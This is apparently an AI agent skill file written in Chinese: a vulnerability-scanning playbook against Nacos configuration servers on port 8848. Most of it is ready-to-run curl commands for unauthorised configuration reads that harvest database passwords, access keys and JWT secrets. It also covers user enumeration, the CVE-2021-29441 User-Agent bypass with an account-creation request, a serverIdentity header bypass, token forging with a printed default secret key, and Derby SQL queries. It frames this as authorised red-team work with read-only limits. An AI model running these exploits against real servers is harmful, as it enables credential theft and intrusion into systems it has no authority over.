---
name: framework-nacos
description: Nacos 专项：8848/server state 指纹、未授权配置读取与用户枚举、CVE-2021-29441 UA 绕过与 addUser、serverIdentity 默认值/token.secret.key 自签 JWT、derby SQL 探测、配置泄密价值链（衔接 Actuator→Nacos POC）
whenToUse: 8848 端口开放、页面/报错出现 Nacos、Spring Cloud Alibaba 资产测绘命中时
role: vuln-scan
enabled: true
---

# Nacos 注册/配置中心专项

## 指纹：8848

```bash
# server state 返回 JSON：含 version、authEnabled（决定后面走哪条路）
curl -s "http://$TARGET:8848/nacos/v1/console/server/state"
# 静态页指纹
curl -s "http://$TARGET:8848/nacos/" | grep -io "nacos"
```

`authEnabled:false` → 直接未授权面；`true` → 进绕过族。

## 未授权配置读取（最高价值，纯只读）

```bash
# 列配置（准确搜索；老版本不需鉴权直接通）
curl -s "http://$TARGET:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&tenant=&pageNo=1&pageSize=99"
# 单配置读：dataId 常见 application.yml / common.properties / {服务名}.yaml
curl -s "http://$TARGET:8848/nacos/v1/cs/configs?dataId=application.yml&group=DEFAULT_GROUP&tenant="
# 模糊（span 匹配 dataId/group）
curl -s "http://$TARGET:8848/nacos/v1/cs/configs?search=blur&dataId=*&group=*&pageNo=1&pageSize=99"
```

泄密价值矩阵：配置文件里的 **MySQL/Redis 密码、AK/SK、内网服务地址、jwt secret** —— 这是 Nacos 命中的核心收益，读到即 High/Critical，无需再打 RCE。

## 用户枚举与 addUser 族

```bash
# auth.enabled=false 时直接列用户（哈希即定性）
curl -s "http://$TARGET:8848/nacos/v1/auth/users?pageNo=1&pageSize=9"
# CVE-2021-29441：默认 UA 绕过（对 1.4.0/1.4.1 且开鉴权场景）
curl -s "http://$TARGET:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" -H "User-Agent: Nacos-Server"
# addUser（CVE-2020-xxxx 族，等价 UA 绕过写入口）——纪律见下
curl -s -X POST "http://$TARGET:8848/nacos/v1/auth/users" -H "User-Agent: Nacos-Server" \
  -d "username=probe&password=probe"
```

## serverIdentity / token.secret.key 默认值绕过

| 场景 | Payload |
|---|---|
| 服务端 identity.key.enabled=true 但用默认值 | 任意请求加头 `serverIdentity: security`（出厂默认），绕过Raft/接口鉴权 |
| 默认 token.secret.key（`SecretKey012345678901234567890123456789012345678901234567890123456789`，AVD-2023-1655789） | 用该 key 自签 JWT：`{"sub":"nacos","exp":9e9}` HS256 → 放 `accessToken` 参数访问全部接口 |

```bash
# 默认 key 探测：直接带自签 token 试列用户
TOKEN=$(python3 -c "见 jwt 工具或本地签发脚本")
curl -s "http://$TARGET:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=$TOKEN"
```

## Derby SQL 探测（AVD-2021-897468）

```bash
# 老版本 ops 接口直查内嵌 derby：users 表即定性
curl -s "http://$TARGET:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users"
curl -s "http://$TARGET:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20config_info%20offset%200%20rows%20fetch%20next%203%20rows%20only"
```

只跑 SELECT 且带 `fetch next 3` 限量；derby 链可进一步转内存马（h0ny 工具支持），纪律上默认不碰。

## 批量与工具（h0ny/NacosExploit）

`java -jar nacos-exploit-3.0.5-jar-with-dependencies.jar`（JDK8）：
- 漏洞检测：默认关认证 / 默认密码 nacos:nacos / 默认 UA / 默认 serverIdentity / 默认 secret.key / derby，一次跑全。
- 认证绕过 → "导出所有配置"遍历命名空间导压缩包（取证友好，优先用它替代手工 curl 遍历）。
- **addUser/"添加权限" 与 JRaft Hessian 反序列化（AVD-2023-1700159，需 JDK8 环境、成功率一般）默认关闭**——RCE/写面只在授权书明示后启用。

## 衔接本地 POC

`pocs/n-a-configuration-exposure-spring-cloud-alibaba-actuator-泄露-nacos-凭据-绕过-show-val/poc.sh` —— Spring Boot Actuator env 泄露 Nacos 凭据（show-val 绕过）后打 Nacos 的链路：actuator 只负责拿凭据，验证与利用在本技能面完成。**Actuator 端点枚举本身见 hunt-springboot，不在此重复。**

## 纪律

- 仅授权范围内测试；默认路径是**纯只读**（state/configs/users 查询/derby select），写操作（addUser/配置写入/JRaft）须授权书明示，否则把"可写面"以原理描述进报告。
- 证据脱敏：配置导出包只截取密钥字段名+打码值；用户列表只留 1-2 条证明。
- 不破坏目标：不删除/覆盖任何 dataId；derby 只 SELECT；实测完成后如做过 addUser 必须书面告知客户账号名以便清理。

## 产出约定

- 记录：authEnabled、命中的绕过方式（UA/serverIdentity/默认 JWT）、可读配置条数、敏感字段类型清单（脱敏）。
- 回填 `redteam_poc_add`：category=nacos（nacos-unauth / nacos-config-leak / nacos-bypass 分列），language=http/shell，usage 写明 curl 与判定 JSON 字段。

<!-- 改编自: h0ny/NacosExploit, zhzyker/exphub, 2026-10-31 -->
